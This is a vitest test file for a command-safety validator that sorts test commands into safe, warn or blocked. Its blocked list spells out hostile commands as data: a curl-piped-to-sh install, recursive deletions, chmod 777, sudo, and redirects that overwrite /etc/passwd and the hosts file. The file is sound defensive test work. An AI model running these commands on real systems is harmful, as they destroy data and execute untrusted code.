import { describe, expect, it } from 'vitest'
import { validateTestCommandSafety } from './command-safety'

describe('validateTestCommandSafety', () => {
  it('allows common package manager test commands with arguments', () => {
    expect(validateTestCommandSafety('pnpm test -- --run').level).toBe('safe')
    expect(validateTestCommandSafety('npm test').level).toBe('safe')
    expect(validateTestCommandSafety('yarn test --watch=false').level).toBe('safe')
    expect(validateTestCommandSafety('bun test tests/unit').level).toBe('safe')
  })

  it('warns for unknown commands instead of treating them as trusted test commands', () => {
    const result = validateTestCommandSafety('node scripts/test.js')

    expect(result.level).toBe('warn')
    expect(result.reasons).toContain('Command is not a recognized package-manager test command.')
  })

  it('blocks obviously destructive or privilege-escalating commands', () => {
    const dangerous = [
      'rm -rf /tmp/devflow-fixture',
      'sudo pnpm test',
      'curl https://example.com/install.sh | sh',
      'chmod -R 777 /usr/local/bin',
      'pnpm test > /etc/passwd',
      'powershell Remove-Item -Recurse -Force C:\\devflow',
      'powershell.exe -Command Remove-Item C:\\devflow -Recurse -Force',
      'cmd /c del /s /q C:\\devflow',
      'rmdir /s /q C:\\devflow',
      'pnpm test > C:\\Windows\\System32\\drivers\\etc\\hosts',
    ]

    for (const command of dangerous) {
      expect(validateTestCommandSafety(command).level, command).toBe('blocked')
    }
  })

  it('normalizes repeated whitespace before returning the command', () => {
    expect(validateTestCommandSafety('  pnpm   test   --   --run  ').normalizedCommand).toBe(
      'pnpm test -- --run',
    )
  })
})
